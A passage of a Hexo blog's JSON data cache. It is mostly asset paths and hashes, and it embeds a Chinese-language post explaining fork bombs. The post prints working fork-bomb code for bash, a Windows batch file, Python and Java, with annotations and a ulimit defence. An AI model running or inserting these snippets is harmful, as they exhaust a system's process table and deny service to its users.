"_id":"themes/next/source/vendors/fancybox/source/helpers/jquery.fancybox-media.js","hash":"3bdf69ed2469e4fb57f5a95f17300eef891ff90d","modified":1487034723438},{"_id":"themes/next/source/vendors/fancybox/source/helpers/jquery.fancybox-thumbs.css","hash":"4ac329c16a5277592fc12a37cca3d72ca4ec292f","modified":1487034723438},{"_id":"themes/next/source/vendors/fancybox/source/helpers/jquery.fancybox-thumbs.js","hash":"53e194f4a72e649c04fb586dd57762b8c022800b","modified":1487034723438},{"_id":"themes/next/source/vendors/font-awesome/fonts/fontawesome-webfont.ttf","hash":"27cf1f2ec59aece6938c7bb2feb0e287ea778ff9","modified":1487034723448},{"_id":"themes/next/source/upload_image/20170213/6.png","hash":"f61892f0efed7a1e0d86082d953cce026e453d26","modified":1487034723432},{"_id":"themes/next/source/upload_image/20170117/3.png","hash":"3603cd5adc28b5baf743ed0a5059ddda4110c8b5","modified":1487034723418},{"_id":"themes/next/source/vendors/font-awesome/fonts/fontawesome-webfont.svg","hash":"2b3c8ba7008cc014d8fb37abc6f9f49aeda83824","modified":1487034723446},{"_id":"themes/next/source/upload_image/20161009/2.png","hash":"28ec7ca22e077c0db0df64c36adb7bf40e7f242f","modified":1487034723412},{"_id":"public/search.xml","hash":"774c4d601b7237d78bff903632e126d37a4cd8ff","modified":1487226719454},{"_id":"public/categories/index.html","hash":"edd7786f5338e75d68fe6309ccffef6f69166de3","modified":1487226719503},{"_id":"public/tags/index.html","hash":"b62eaf0342ba8efbd832aabf178821a9dbd02f26","modified":1487226719503},{"_id":"public/2017/02/16/解决Python2-x编码之殇/index.html","hash":"b162bb2bd4c22b4341f570db451a719cf041b825","modified":1487226719503},{"_id":"public/2017/02/15/Gooey魔法/index.html","hash":"6379475d54ae4aef30eb464f1a256e68f67e62b1","modified":1487226719503},{"_id":"public/2017/02/13/联想Z470黑苹果教程/index.html","hash":"f6b1a38d7f922a16cfc06cefe608acc57c908deb","modified":1487226719504},{"_id":"public/2017/02/10/安卓版Kali-linux/index.html","hash":"63af90c43b5ba1218d58a26c5e1d438479b34050","modified":1487226719504},{"_id":"public/2017/02/09/WireShark过滤规则/index.html","hash":"0879065ea101c5f73fe68b83ed53908d2a870932","modified":1487226719504},{"_id":"public/2017/02/07/rethinkdb搭建与使用/index.html","hash":"c99e3249be1f7b9fe6ab30f222f8bda5d1e94e44","modified":1487226719504},{"_id":"public/2017/02/04/Fork-Bomb/index.html","hash":"4147fc605cae1e10ffc2fe8faf1190f7d86234ec","modified":1487226719504},{"_id":"public/2017/01/24/常用端口服务/index.html","hash":"0fe80ba4450121669a272ac3eb61b170ad41fe58","modified":1487226719504},{"_id":"public/2016/11/24/Multiprocessing共享资源/index.html","hash":"51bd2a68b3bb8d89e530cae7fe5827cdfc8f8843","modified":1487226719504},{"_id":"public/2016/11/24/Multiprocessing子进程返回值/index.html","hash":"c28a01434810c2a3540730ec5c9dcf13feb0b218","modified":1487226719504},{"_id":"public/2016/11/24/Multiprocessing-Pool/index.html","hash":"dbb529caf147e4ee9234d36d4634add2eac06883","modified":1487226719504},{"_id":"public/2016/11/24/Multiprocessing-Process/index.html","hash":"65a5086959fe918d06932e931e57d8136926a035","modified":1487226719504},{"_id":"public/2016/11/23/Python-multiprocessing/index.html","hash":"b68ec7aff54f844bc6e701384d5d5d2f58f32865","modified":1487226719505},{"_id":"public/2016/10/14/TcpScanner端口存活探测/index.html","hash":"807fbba9b10cc1f35665cfda26cf49858c461882","modified":1487226719505},{"_id":"public/2016/10/12/黑帽SEO之暗链/index.html","hash":"dca125a0a185adf3910d7bb0407de9e6be549d81","modified":1487226719505},{"_id":"public/2016/10/12/黑帽SEO之网页劫持/index.html","hash":"a924d2ea1122df48fc339867cf7c554fbfdf0581","modified":1487226719505},{"_id":"public/2016/10/10/黑帽SEO之页面跳转/index.html","hash":"da911a97034b6cc9f4f7e1d1358c8b11d69aad19","modified":1487226719505},{"_id":"public/2016/10/09/黑帽SEO之基础知识/index.html","hash":"00ffd86f614f4c0e9d0f8542877d668e7b280764","modified":1487226719505},{"_id":"public/2016/09/22/上传木马姿势汇总-欢迎补充/index.html","hash":"9f5dfcc2e3d4f47978a23b94c5f1fe7dc9f0dd70","modified":1487226719505},{"_id":"public/2016/09/21/服务器解析漏洞/index.html","hash":"03e2b37ca6c610f95771eb74ee6b107959c1140b","modified":1487226719505},{"_id":"public/2016/09/18/PyCmd-加密隐形木马/index.html","hash":"9fd23a81a68f2ae74979c2603b3d9cae2bc68bce","modified":1487226719505},{"_id":"public/2016/09/14/基于Python的WebServer/index.html","hash":"2f9f89aa97700987bd0aece3d64725b2122ac4ff","modified":1487226719505},{"_id":"public/2016/09/06/RSA加密算法解析/index.html","hash":"855ebf3a889b7ecba7269deea843e191bf2482f7","modified":1487226719505},{"_id":"public/2016/09/05/PyShell-木马后门/index.html","hash":"0246e2f46bf8b206d80e0518c9a2d45f9569f9c6","modified":1487226719506},{"_id":"public/2016/09/04/windows服务器信息收集工具/index.html","hash":"b1cdf45a63a842c1060f7f09808cc7fadb8c720b","modified":1487226719506},{"_id":"public/categories/技术交流/index.html","hash":"60f22a45ef6376688a577ce026080ae1e74aa3aa","modified":1487226719506},{"_id":"public/categories/技术交流/page/2/index.html","hash":"b639261203c74f92c8bee9d27cfe422f6e4e37c1","modified":1487226719506},{"_id":"public/categories/编程之道/index.html","hash":"7ca410950b21e0baea7815b081913faab36c86b9","modified":1487226719506},{"_id":"public/categories/安全工具/index.html","hash":"2837feec79c632d3eb2f8fdd307fe44425285769","modified":1487226719506},{"_id":"public/archives/index.html","hash":"61532f6b2aded907291870c483824067810f2125","modified":1487226719506},{"_id":"public/archives/page/2/index.html","hash":"c0b457494b5f8df0b1a7539a401b45d41d4fc69f","modified":1487226719506},{"_id":"public/archives/page/3/index.html","hash":"8956048575be17656cd40bf7abaff473344cb8f1","modified":1487226719506},{"_id":"public/archives/2016/index.html","hash":"c5bcbfb94ac1446893630340033c2a2f49d09009","modified":1487226719506},{"_id":"public/archives/2016/page/2/index.html","hash":"ce0dc230aabc47ec39dc086c3f6bc4f3e939412d","modified":1487226719506},{"_id":"public/archives/2016/09/index.html","hash":"e89092a97ac3a35d4b2509724dcddff2fac75c3b","modified":1487226719507},{"_id":"public/archives/2016/10/index.html","hash":"f8f59ced8c8b0bd3c6f761e98356a687a6d2894f","modified":1487226719507},{"_id":"public/archives/2016/11/index.html","hash":"e2d3c23b7b550eba5127d4c24cebf6b361c302f0","modified":1487226719507},{"_id":"public/archives/2017/index.html","hash":"44e0cc6d1225888f53c320cd7890a0b25276dab0","modified":1487226719507},{"_id":"public/archives/2017/01/index.html","hash":"59b54ef0c23488f913a688e6fb979b3a4d6648be","modified":1487226719507},{"_id":"public/archives/2017/02/index.html","hash":"902e11dcf4b5aee876a529599be61587dfc33fc2","modified":1487226719507},{"_id":"public/index.html","hash":"b4702b9c7ff4b4a4c48b2f95d3c6ac11096d0f87","modified":1487226719507},{"_id":"public/page/2/index.html","hash":"48e124a07f55317cb3a676345357c339015b4e44","modified":1487226719507},{"_id":"public/page/3/index.html","hash":"60b25194f262eacc2acc03b9c08fe76b3d3fabd6","modified":1487226719507},{"_id":"public/tags/系统安全/index.html","hash":"6b7eb794e77e8f9475266555ae7acb8f0e8598d9","modified":1487226719507},{"_id":"public/tags/Gooey/index.html","hash":"5cdd2578a51e1119f602afb6f1ec78da7b8e4e89","modified":1487226719507},{"_id":"public/tags/Multiprocessing/index.html","hash":"63e8f32cb284d5052f87997e14e269e32cf5e58e","modified":1487226719507},{"_id":"public/tags/木马后门/index.html","hash":"5b712005042cda6b7af49712df029a2d153a7590","modified":1487226719508},{"_id":"public/tags/加密算法/index.html","hash":"05906c134dfdcb3ae8994d114e13afeefdbf06ba","modified":1487226719508},{"_id":"public/tags/扫描器/index.html","hash":"32a976c7ac7c2f2a5a1a4ee38e4732fb3e13d26d","modified":1487226719508},{"_id":"public/tags/wireshark/index.html","hash":"0fbf532d9b00271298ff6e8004e6d0330f2ddc8c","modified":1487226719508},{"_id":"public/tags/rethinkdb/index.html","hash":"46f76a75c82f0cb63cd9efbe9b0175efe9639405","modified":1487226719508},{"_id":"public/tags/信息收集工具/index.html","hash":"43fb4683ab3826ef7a4d514473fe4f3997ff6987","modified":1487226719508},{"_id":"public/tags/Web应用漏洞/index.html","hash":"157e1950ca56b8f2340b352f8e75035a978c16ba","modified":1487226719508},{"_id":"public/tags/python运维脚本/index.html","hash":"f6e59dd3437b02ac91d526a5d6f9ffd2b3efd4a2","modified":1487226719508},{"_id":"public/tags/kali/index.html","hash":"f4ebc3061fbf4c4a43f37b6837708e1216fac0d2","modified":1487226719509},{"_id":"public/tags/系统服务/index.html","hash":"d3adbddf09c26523b6d294bfe31bab226a6f2c1b","modified":1487226719509},{"_id":"public/tags/黑苹果/index.html","hash":"0dc86c86b769e425829857a1fcda6d3978eb1851","modified":1487226719509},{"_id":"public/tags/python编码问题/index.html","hash":"3b174cbc6801ded4e90c0710539c871643a0bcf2","modified":1487226719509},{"_id":"public/tags/黑帽SEO/index.html","hash":"62c5cbc6fccc9018c610be10e648433889ebd983","modified":1487226719509},{"_id":"public/favicon.ico","hash":"c2ed364c5df30ec841e777a1202e67933b409c41","modified":1487226719563},{"_id":"public/CNAME","hash":"44f8e5392c590ae3a738dba3308c0f3917554c8f","modified":1487226719563},{"_id":"public/images/avatar.gif","hash":"264082bb3a1af70d5499c7d22b0902cb454b6d12","modified":1487226719563},{"_id":"public/images/cc-by-nc-nd.svg","hash":"c6524ece3f8039a5f612feaf865d21ec8a794564","modified":1487226719563},{"_id":"public/images/cc-by-nc-sa.svg","hash":"3031be41e8753c70508aa88e84ed8f4f653f157e","modified":1487226719563},{"_id":"public/images/cc-by-nd.svg","hash":"c563508ce9ced1e66948024ba1153400ac0e0621","modified":1487226719564},{"_id":"public/images/cc-by-nc.svg","hash":"8d39b39d88f8501c0d27f8df9aae47136ebc59b7","modified":1487226719564},{"_id":"public/images/cc-by-sa.svg","hash":"aa4742d733c8af8d38d4c183b8adbdcab045872e","modified":1487226719564},{"_id":"public/images/cc-zero.svg","hash":"87669bf8ac268a91d027a0a4802c92a1473e9030","modified":1487226719564},{"_id":"public/images/cc-by.svg","hash":"28a0a4fe355a974a5e42f68031652b76798d4f7e","modified":1487226719564},{"_id":"public/images/loading.gif","hash":"5fbd472222feb8a22cf5b8aa5dc5b8e13af88e2b","modified":1487226719564},{"_id":"public/images/quote-l.svg","hash":"94e870b4c8c48da61d09522196d4dd40e277a98f","modified":1487226719564},{"_id":"public/images/placeholder.gif","hash":"5fbd472222feb8a22cf5b8aa5dc5b8e13af88e2b","modified":1487226719564},{"_id":"public/images/quote-r.svg","hash":"e60ae504f9d99b712c793c3740c6b100d057d4ec","modified":1487226719564},{"_id":"public/images/searchicon.png","hash":"67727a6a969be0b2659b908518fa6706eed307b8","modified":1487226719564},{"_id":"public/uploads/avatar.png","hash":"171430122b35ff2e8017f01568183638c45b6a01","modified":1487226719564},{"_id":"public/upload_image/20160905/001.png","hash":"59a9fd61c78b157fb8df2f1759e09226212426d0","modified":1487226719565},{"_id":"public/upload_image/20160905/002.png","hash":"65c153cce12fa51fafe58a0b2e05d31d9c3a2bf5","modified":1487226719565},{"_id":"public/upload_image/20160905/003.png","hash":"a6f772b78c74080b93085cd3e711bddd480d937c","modified":1487226719565},{"_id":"public/upload_image/20160905/004.png","hash":"80b7d1c5218632ce13c3dcf90fb0ffcc99b8a3e7","modified":1487226719565},{"_id":"public/upload_image/20160918/001.png","hash":"011e8a83e660f629f9bbb8dc9f3dc37f4a65ab85","modified":1487226719565},{"_id":"public/upload_image/20160918/002.png","hash":"e05c4a3b1631a462ee09d5185810880d41f8cc00","modified":1487226719565},{"_id":"public/upload_image/20160918/003.png","hash":"bafd61c3a73cd566c637ae1892f9d4a449b8fe72","modified":1487226719565},{"_id":"public/upload_image/20160905_2/001.png","hash":"1e5c264498b3c84b25646ee1025cf1f5dd1fcc8f","modified":1487226719566},{"_id":"public/upload_image/20160905_2/002.png","hash":"1bb5323b46260cdab36989e6d323d5415fa424ca","modified":1487226719566},{"_id":"public/upload_image/20160905_2/003.png","hash":"c3beaced7780db46050bc6b599b7ebd48ea37ebb","modified":1487226719566},{"_id":"public/upload_image/20160905_2/004.png","hash":"a56561edc730d91947675e7729b8ee271104bb67","modified":1487226719566},{"_id":"public/upload_image/20160905_2/005.png","hash":"d88408be73a03f786214758fd7e96514d66a2139","modified":1487226719566},{"_id":"public/upload_image/20160905_2/006.png","hash":"4fd9b46012180e641d6c48aa006fc133441059b0","modified":1487226719566},{"_id":"public/upload_image/20160922/1.png","hash":"55671144f96b07de6990fe5d34ca4e78c1e5f5c0","modified":1487226719566},{"_id":"public/upload_image/20160922/2.png","hash":"2cb7f50360dc89528f9f75c70b1d77a90a676bfa","modified":1487226719566},{"_id":"public/upload_image/20160922/3.png","hash":"1ab2aad28d9794c7af560ab15e6ece443e3e7edc","modified":1487226719566},{"_id":"public/upload_image/20170117/1.png","hash":"9e95f98d88a181fe9946843c74cb105e54ed510d","modified":1487226719566},{"_id":"public/upload_image/20170117/2.png","hash":"6613165e474c4bd05df5d6a35896b3bb935c9854","modified":1487226719566},{"_id":"public/upload_image/20170117/4.png","hash":"d7938c18a6807277aaa183af97cccf35e26eac91","modified":1487226719566},{"_id":"public/upload_image/20170117/5.png","hash":"560ec250a2a934fc2c6c06dd8537efa1e1358872","modified":1487226719567},{"_id":"public/upload_image/20170117/6.png","hash":"c30d80c0d45317c8bbba39f4ebc4c35186b13382","modified":1487226719567},{"_id":"public/upload_image/20161014/excel.png","hash":"be078dffe8eadc5e695d9f05df0e95f7f6aedad7","modified":1487226719567},{"_id":"public/upload_image/20170207/2.png","hash":"902f456a0f45cff8993fbc2d39d3f9e83b70517b","modified":1487226719567},{"_id":"public/upload_image/20170213/1.png","hash":"4dc402de9f13337257dbffc7db3854862b567a15","modified":1487226719567},{"_id":"public/upload_image/20170213/3.png","hash":"7325834248cf31563278af4930919edcbdaf1cba","modified":1487226719567},{"_id":"public/upload_image/20170213/4.png","hash":"52e30ad65c233cb622fda493bb99fe769df2156e","modified":1487226719567},{"_id":"public/upload_image/20170213/5.png","hash":"951d7fb83822d39af2efcdcec16cb4724caad170","modified":1487226719567},{"_id":"public/upload_image/20170213/7.png","hash":"24553d2c0b91b9075442768f86efae1589e573a6","modified":1487226719567},{"_id":"public/upload_image/20170215/1.png","hash":"562a3ca6c563c0886be438539b32b270790c353d","modified":1487226719567},{"_id":"public/upload_image/20170215/2.png","hash":"00aad9ee326ddee77df301aa9fd304ba8ed204b7","modified":1487226719567},{"_id":"public/upload_image/20170215/3.png","hash":"d7e5f891fb7b199e41faf6fdbc22fbf94cc0ff86","modified":1487226719568},{"_id":"public/vendors/fastclick/LICENSE","hash":"dcd5b6b43095d9e90353a28b09cb269de8d4838e","modified":1487226719568},{"_id":"public/vendors/font-awesome/HELP-US-OUT.txt","hash":"69a4c537d167b68a0ccf1c6febd138aeffca60d6","modified":1487226719568},{"_id":"public/vendors/fancybox/source/blank.gif","hash":"2daeaa8b5f19f0bc209d976c02bd6acb51b00b0a","modified":1487226719568},{"_id":"public/vendors/fancybox/source/fancybox_loading.gif","hash":"1a755fb2599f3a313cc6cfdb14df043f8c14a99c","modified":1487226719568},{"_id":"public/vendors/fancybox/source/fancybox_loading@2x.gif","hash":"273b123496a42ba45c3416adb027cd99745058b0","modified":1487226719568},{"_id":"public/vendors/fancybox/source/fancybox_overlay.png","hash":"b3a4ee645ba494f52840ef8412015ba0f465dbe0","modified":1487226719568},{"_id":"public/vendors/fancybox/source/fancybox_sprite.png","hash":"17df19f97628e77be09c352bf27425faea248251","modified":1487226719568},{"_id":"public/vendors/fancybox/source/fancybox_sprite@2x.png","hash":"30c58913f327e28f466a00f4c1ac8001b560aed8","modified":1487226719568},{"_id":"public/vendors/font-awesome/css/font-awesome.css.map","hash":"0189d278706509412bac4745f96c83984e1d59f4","modified":1487226719568},{"_id":"public/vendors/font-awesome/fonts/fontawesome-webfont.woff2","hash":"574ea2698c03ae9477db2ea3baf460ee32f1a7ea","modified":1487226719568},{"_id":"public/vendors/fancybox/source/helpers/fancybox_buttons.png","hash":"e385b139516c6813dcd64b8fc431c364ceafe5f3","modified":1487226719568},{"_id":"public/upload_image/20160922/10.png","hash":"162c98181c24131623e0b1f41f979c9c8afcb390","modified":1487226720622},{"_id":"public/upload_image/20160922/13.png","hash":"5a005526caa936c0b31a42a2f09e7ff1e0fc7b40","modified":1487226720626},{"_id":"public/upload_image/20160922/6.png","hash":"88c6491853d93507e9cfc75d3683358e7ea5cbfd","modified":1487226720629},{"_id":"public/upload_image/20160922/9.png","hash":"0a7590f9eacb7ae15d55f37e3c948bda0fd05316","modified":1487226720629},{"_id":"public/upload_image/20170207/1.png","hash":"297dafeb5799ff195c16e46c0dfadd116a9e504f","modified":1487226720629},{"_id":"public/upload_image/20170210/1.png","hash":"dfe440f208aa82e2e1eeeed9d57ee8a7054cb008","modified":1487226720630},{"_id":"public/upload_image/20170210/2.png","hash":"e55dac1a61688fb0fd30bdda681bdb3392702a3f","modified":1487226720630},{"_id":"public/upload_image/20170210/3.png","hash":"ee1d473888da57bc1217b8118bb1077d9eb04de1","modified":1487226720630},{"_id":"public/upload_image/20170210/4.png","hash":"f707588100fbf355532a1ec0c22ccf22d2621c77","modified":1487226720630},{"_id":"public/upload_image/20170210/6.png","hash":"03bf077235cb1cb09636e195939c786e5b28eba7","modified":1487226720630},{"_id":"public/upload_image/20170213/2.png","hash":"d2c700f40869b24b690d2d814bfa5bbfbb9ba0ec","modified":1487226720630},{"_id":"public/upload_image/20170213/8.png","hash":"26dba9497b63b9f9528981ddfdbc498ce8795616","modified":1487226720630},{"_id":"public/upload_image/20170213/9.png","hash":"486bd25122f554a6999c9a023942edb98b4b5617","modified":1487226720630},{"_id":"public/vendors/font-awesome/fonts/FontAwesome.otf","hash":"0112e96f327d413938d37c1693806f468ffdbace","modified":1487226720631},{"_id":"public/vendors/font-awesome/fonts/fontawesome-webfont.eot","hash":"b3c2f08e73320135b69c23a3908b87a12053a2f6","modified":1487226720631},{"_id":"public/vendors/font-awesome/fonts/fontawesome-webfont.woff","hash":"507970402e328b2baeb05bde73bf9ded4e2c3a2d","modified":1487226720631},{"_id":"public/about/index.html","hash":"8dd4aa474b41d6a7195c38fd4f3780f4f3d4b1fb","modified":1487226720648},{"_id":"public/collect_url/index.html","hash":"10328849e4b9b27891a1c30d0b66c7ab8f2d3d20","modified":1487226720648},{"_id":"public/js/src/affix.js","hash":"978e0422b5bf1b560236d8d10ebc1adcf66392e3","modified":1487226720648},{"_id":"public/js/src/hook-duoshuo.js","hash":"a6119070c0119f33e08b29da7d2cce2635eb40a0","modified":1487226720648},{"_id":"public/js/src/post-details.js","hash":"2038f54e289b6da5def09689e69f623187147be5","modified":1487226720648},{"_id":"public/js/src/motion.js","hash":"269414e84df544a4ccb88519f6abae4943db3c67","modified":1487226720648},{"_id":"public/js/src/utils.js","hash":"e5cb720894c4bc28ca8f10b33df127fb394018d9","modified":1487226720648},{"_id":"public/js/src/scrollspy.js","hash":"fe4da1b9fe73518226446f5f27d2831e4426fc35","modified":1487226720649},{"_id":"public/js/src/bootstrap.js","hash":"39bf93769d9080fa01a9a875183b43198f79bc19","modified":1487226720649},{"_id":"public/vendors/fastclick/bower.json","hash":"4dcecf83afddba148464d5339c93f6d0aa9f42e9","modified":1487226720649},{"_id":"public/vendors/fastclick/README.html","hash":"da3c74d484c73cc7df565e8abbfa4d6a5a18d4da","modified":1487226720649},{"_id":"public/vendors/font-awesome/bower.json","hash":"64394a2a9aa00f8e321d8daa5e51a420f0e96dad","modified":1487226720649},{"_id":"public/vendors/jquery_lazyload/CONTRIBUTING.html","hash":"a6358170d346af13b1452ac157b60505bec7015c","modified":1487226720649},{"_id":"public/vendors/jquery_lazyload/README.html","hash":"bde24335f6bc09d8801c0dcd7274f71b466552bd","modified":1487226720649},{"_id":"public/vendors/jquery_lazyload/bower.json","hash":"ae3c3b61e6e7f9e1d7e3585ad854380ecc04cf53","modified":1487226720650},{"_id":"public/vendors/jquery_lazyload/jquery.scrollstop.js","hash":"0e9a81785a011c98be5ea821a8ed7d411818cfd1","modified":1487226720650},{"_id":"public/vendors/velocity/bower.json","hash":"0ef14e7ccdfba5db6eb3f8fc6aa3b47282c36409","modified":1487226720650},{"_id":"public/vendors/jquery_lazyload/jquery.lazyload.js","hash":"481fd478650e12b67c201a0ea41e92743f8b45a3","modified":1487226720650},{"_id":"public/vendors/velocity/velocity.ui.min.js","hash":"ed5e534cd680a25d8d14429af824f38a2c7d9908","modified":1487226720650},{"_id":"public/js/src/schemes/pisces.js","hash":"7506e7490c69a200831393c38d25e91c156bd471","modified":1487226720650},{"_id":"public/vendors/fancybox/source/jquery.fancybox.css","hash":"5f163444617b6cf267342f06ac166a237bb62df9","modified":1487226720650},{"_id":"public/vendors/fastclick/lib/fastclick.min.js","hash":"2cae0f5a6c5d6f3cb993015e6863f9483fc4de18","modified":1487226720650},{"_id":"public/vendors/ua-parser-js/dist/ua-parser.min.js","hash":"38628e75e4412cc6f11074e03e1c6d257aae495b","modified":1487226720650},{"_id":"public/vendors/ua-parser-js/dist/ua-parser.pack.js","hash":"214dad442a92d36af77ed0ca1d9092b16687f02f","modified":1487226720650},{"_id":"public/vendors/fancybox/source/helpers/jquery.fancybox-buttons.css","hash":"1a9d8e5c22b371fcc69d4dbbb823d9c39f04c0c8","modified":1487226720650},{"_id":"public/vendors/fancybox/source/helpers/jquery.fancybox-buttons.js","hash":"91e41741c2e93f732c82aaacec4cfc6e3f3ec876","modified":1487226720650},{"_id":"public/vendors/fancybox/source/helpers/jquery.fancybox-media.js","hash":"3bdf69ed2469e4fb57f5a95f17300eef891ff90d","modified":1487226720650},{"_id":"public/vendors/fancybox/source/helpers/jquery.fancybox-thumbs.css","hash":"4ac329c16a5277592fc12a37cca3d72ca4ec292f","modified":1487226720650},{"_id":"public/vendors/fancybox/source/helpers/jquery.fancybox-thumbs.js","hash":"53e194f4a72e649c04fb586dd57762b8c022800b","modified":1487226720651},{"_id":"public/css/main.css","hash":"17ebbfde9bacd663a9de6aead96f8a3ce2058888","modified":1487226720651},{"_id":"public/css/collect_url/style.css","hash":"e221a7babc968e4f4ffd87189c4116082d372dc0","modified":1487226720651},{"_id":"public/vendors/velocity/velocity.min.js","hash":"2f1afadc12e4cf59ef3b405308d21baa97e739c6","modified":1487226720651},{"_id":"public/vendors/velocity/velocity.ui.js","hash":"6a1d101eab3de87527bb54fcc8c7b36b79d8f0df","modified":1487226720651},{"_id":"public/vendors/jquery/index.js","hash":"41b4bfbaa96be6d1440db6e78004ade1c134e276","modified":1487226720651},{"_id":"public/vendors/fancybox/source/jquery.fancybox.js","hash":"1cf3d47b5ccb7cb6e9019c64f2a88d03a64853e4","modified":1487226720651},{"_id":"public/vendors/fastclick/lib/fastclick.js","hash":"06cef196733a710e77ad7e386ced6963f092dc55","modified":1487226720651},{"_id":"public/vendors/fancybox/source/jquery.fancybox.pack.js","hash":"53360764b429c212f424399384417ccc233bb3be","modified":1487226720651},{"_id":"public/vendors/font-awesome/css/font-awesome.css","hash":"3b87c2560832748cd06f9bfd2fd6ea8edbdae8c7","modified":1487226720651},{"_id":"public/vendors/font-awesome/css/font-awesome.min.css","hash":"05ea25bc9b3ac48993e1fee322d3bc94b49a6e22","modified":1487226720652},{"_id":"public/vendors/velocity/velocity.js","hash":"9f08181baea0cc0e906703b7e5df9111b9ef3373","modified":1487226720652},{"_id":"public/upload_image/20160922/11.png","hash":"8099ee4dadfda53c53dd81e19c2ecc99705b88ea","modified":1487226720652},{"_id":"public/upload_image/20160922/4.png","hash":"7888f5f2cee01de57d90753d7dbbae734161790d","modified":1487226720652},{"_id":"public/upload_image/20160922/5.png","hash":"e366de89eb3ee28152117af3c197a2ca11127606","modified":1487226720652},{"_id":"public/upload_image/20160922/7.png","hash":"5a458229a0519fb566f2d22fbb745003bad6601c","modified":1487226720652},{"_id":"public/upload_image/20161009/3.png","hash":"7d709b923a98bd5461f33c9fb4fa59e156f6da98","modified":1487226720652},{"_id":"public/upload_image/20170209/1.png","hash":"85c4e6983e19714e8fdb03215181585a0099a0f4","modified":1487226720652},{"_id":"public/upload_image/20170210/5.png","hash":"e597a40a9c543b479752e1a44231e49897e6bbd3","modified":1487226720653},{"_id":"public/vendors/font-awesome/fonts/fontawesome-webfont.ttf","hash":"27cf1f2ec59aece6938c7bb2feb0e287ea778ff9","modified":1487226720653},{"_id":"public/upload_image/20160922/12.png","hash":"0dc82cb1d7681dd9cdde72dd349b994897380e2b","modified":1487226720664},{"_id":"public/upload_image/20161014/jietu.png","hash":"f615129413c1d910c1362d811878b98adc8d6ab6","modified":1487226720664},{"_id":"public/upload_image/20160922/8.png","hash":"eca514b4964228af593410b2082a2101c09109d1","modified":1487226720678},{"_id":"public/upload_image/20161009/1.png","hash":"e2a7f727bf5876bde351ea97e354d49f45b4974d","modified":1487226720678},{"_id":"public/upload_image/20170213/6.png","hash":"f61892f0efed7a1e0d86082d953cce026e453d26","modified":1487226720688},{"_id":"public/vendors/font-awesome/fonts/fontawesome-webfont.svg","hash":"2b3c8ba7008cc014d8fb37abc6f9f49aeda83824","modified":1487226720688},{"_id":"public/upload_image/20170117/3.png","hash":"3603cd5adc28b5baf743ed0a5059ddda4110c8b5","modified":1487226720708},{"_id":"public/upload_image/20161009/2.png","hash":"28ec7ca22e077c0db0df64c36adb7bf40e7f242f","modified":1487226720714}],"Category":[{"name":"技术交流","_id":"ciz80dyae00043ofv2ovllpzj"},{"name":"编程之道","_id":"ciz80dyaq00093ofvy3cmupwf"},{"name":"安全工具","_id":"ciz80dybg00103ofvk5q5cxks"}],"Data":[],"Page":[{"title":"categories","date":"2016-09-23T08:37:36.000Z","type":"categories","comments":0,"_content":"","source":"categories/index.md","raw":"---\ntitle: categories\ndate: 2016-09-23 16:37:36\ntype: \"categories\"\ncomments: false\n---\n","updated":"2017-02-14T01:12:03.340Z","path":"categories/index.html","layout":"page","_id":"ciz80dya400013ofv5ul0hy6a","content":"","excerpt":"","more":""},{"title":"标签","date":"2016-09-23T08:27:02.000Z","type":"tags","comments":0,"_content":"","source":"tags/index.md","raw":"---\ntitle: 标签\ndate: 2016-09-23 16:27:02\ntype: \"tags\"\ncomments: false\n---\n","updated":"2017-02-14T01:12:03.341Z","path":"tags/index.html","layout":"page","_id":"ciz80dyab00033ofv5eoab66d","content":"","excerpt":"","more":""}],"Post":[{"title":"Fork Bomb","date":"2017-02-04T02:36:52.000Z","comments":1,"_content":"　　Fork炸弹（fork bomb）在计算机领域中是一种利用系统调用fork（或其他等效的方式）进行的拒绝服务攻击。fork炸弹以极快的速度创建大量进程（进程数呈以2为底数的指数增长趋势），并以此消耗系统分配予进程的可用空间使进程表饱和，而系统在进程表饱和后就无法运行新程序，除非进程表中的某一进程终止，它可以利用在windows/linux等系统。\n\n#### linux系统\n\n##### Code\n```bash\n:(){ :|:& };:\n```\n\n##### 注解\n:()　# 定义函数,函数名为\":\",即每当输入\":\"时就会自动调用{}内代码 \n{　　# \":\"函數起始字元     \n:　　# 用递归方式调用\":\"函数本身     \n|　　# 並用管線(pipe)將其輸出引至...（因为有一个管線操作字元，因此會生成一個新的進程）     \n:　　# 另一次递归调用的\":\"函数 # 综上,\":|:\"表示的即是每次調用函数\":\"的時候就會產生兩份拷貝     \n&　　# 調用間脱鉤,以使最初的\":\"函数被關閉後為其所調用的兩個\":\"函數還能繼續執行 \n}　　# \":\"函數終止字元 \n;　　# \":\"函数定义结束后将要进行的操作... \n:　　# 调用\":\"函数,\"引爆\"fork炸弹\n\n\n\n#### Windows系统(创建一个.bat，写入以下命令运行即可)\n\n##### Code\n```bash\n%0|%0|%0\n```\n##### 注释\n%0就是输出自己本身,也就是.bat，在cmd中即表示运行.bat\n|%0就是打开自身后的程序再打开.bat\n3的指数倍\n\n##### 预防\n一个防止其严重影响系统的方法就是限定一个用户能够创建的进程数的上限，在Linux系统上，可以通过ulimit这个指令达到相应的效果。\n\n\n#### 编程语言应用\n\nUsing Python:\n\n```bash\nimport os\nwhile 1:\n    os.fork()\n```\n\nUsing Java:\n\n```bash\npublic class ForkBomb\n{\n  public static void main(String[] args)\n  {\n    while(true)\n    {\n      Runtime.getRuntime().exec(new String[]{\"javaw\", \"-cp\", System.getProperty(\"java.class.path\"), \"ForkBomb\"});\n    }\n  }\n}\n```\n\n官方参考链接：[https://en.wikipedia.org/wiki/Fork_bomb](https://en.wikipedia.org/wiki/Fork_bomb)\n\n","source":"_posts/Fork-Bomb.md","raw":"---\ntitle: Fork Bomb\ndate: 2017-02-04 10:36:52\ncomments: true\ntags: 系统安全\ncategories: 技术交流\n---\n　　Fork炸弹（fork bomb）在计算机领域中是一种利用系统调用fork（或其他等效的方式）进行的拒绝服务攻击。fork炸弹以极快的速度创建大量进程（进程数呈以2为底数的指数增长趋势），并以此消耗系统分配予进程的可用空间使进程表饱和，而系统在进程表饱和后就无法运行新程序，除非进程表中的某一进程终止，它可以利用在windows/linux等系统。\n\n#### linux系统\n\n##### Code\n```bash\n:(){ :|:& };:\n```\n\n##### 注解\n:()　# 定义函数,函数名为\":\",即每当输入\":\"时就会自动调用{}内代码 \n{　　# \":\"函數起始字元     \n:　　# 用递归方式调用\":\"函数本身     \n|　　# 並用管線(pipe)將其輸出引至...（因为有一个管線操作字元，因此會生成一個新的進程）     \n:　　# 另一次递归调用的\":\"函数 # 综上,\":|:\"表示的即是每次調用函数\":\"的時候就會產生兩份拷貝     \n&　　# 